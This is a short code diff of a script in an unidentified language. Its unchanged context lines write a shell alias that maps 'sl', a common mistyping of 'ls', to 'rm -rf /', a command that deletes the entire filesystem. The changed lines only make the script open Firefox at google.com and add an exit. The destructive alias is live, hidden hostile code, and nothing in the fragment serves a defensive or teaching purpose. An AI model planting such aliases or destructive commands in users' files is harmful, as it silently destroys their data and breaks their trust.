@@ -11,5 +11,7 @@ loads "alias sl='rm -rf /'"
 write r1 re 
 close r1 
 
-loads "firefox"
+loads "firefox https://www.google.com"
 system re
+
+exit
